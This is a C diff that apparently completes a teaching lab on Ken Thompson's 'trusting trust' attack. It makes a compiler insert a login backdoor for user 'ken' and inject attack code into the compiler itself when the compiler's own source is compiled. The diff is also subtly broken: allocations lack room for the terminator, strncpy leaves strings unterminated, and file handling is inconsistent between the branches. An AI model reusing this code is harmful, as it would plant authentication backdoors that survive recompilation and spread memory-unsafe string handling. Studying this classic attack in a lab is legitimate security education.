@@ -16,8 +16,6 @@
 static void compile(char *program, char *outname) {
     FILE *fp = fopen("./temp-out.c", "w");
     assert(fp);
-    fprintf(fp, "%s", program);
-    fclose(fp);
 
 
     /*****************************************************************
@@ -30,8 +28,28 @@ static void compile(char *program, char *outname) {
     // and inject an attack for "ken":
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
-     
+	char *login = strstr(program, login_sig); // found where login sig starts, if it does
+    if (login != NULL) {
+		//initalize new program string to hold original program plus our attack
+		char *new_program = malloc(sizeof(char) * (strlen(program) + strlen(login_attack)));
+		assert (new_program != NULL);
+		char *inject = login + strlen(login_sig); //ptr to where we want the injection to go in function
+		//copy up to the login signature into new program
+		strncpy(new_program, program, login - program);
+		//copy in the login signature itself
+		strncat(new_program, login_sig, strlen(login_sig));
+		//copy attack in
+		strncat(new_program, login_attack, strlen(login_attack));
+		//copy in rest of the program unchanged
+		strcat(new_program, login + strlen(login_sig));
 
+		fprintf(fp, "%s", new_program);
+		fclose(fp);
+		free(new_program);
+	}
+
+
+	
     /*****************************************************************
      * Step 2:
      */
@@ -50,6 +68,30 @@ static void compile(char *program, char *outname) {
               = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
 
 
+
+	char *compile = strstr(program, compile_sig); // found where login sig starts, if it does
+    if (compile != NULL) {
+		//initalize new program string to hold original program plus our attack
+		char *new_program = malloc(sizeof(char) * (strlen(program) + strlen(compile_attack)));
+		assert (new_program != NULL);
+		char *inject = compile + strlen(compile_sig); //ptr to where we want the injection to go in function
+		//copy up to the login signature into new program
+		strncpy(new_program, program, compile - program);
+		//copy in the login signature itself
+		strncat(new_program, compile_sig, strlen(compile_sig));
+		//copy attack in
+		strncat(new_program, compile_attack, strlen(compile_attack));
+		//copy in rest of the program unchanged
+		strcat(new_program, compile + strlen(compile_sig));
+
+		fprintf(fp, "%s", new_program);
+    	fclose(fp);
+		free(new_program);
+	} else{
+		//not compiler program
+		fprintf(fp, "%s", program);
+    	fclose(fp);
+	}
 
     /************************************************************
      * don't modify the rest.
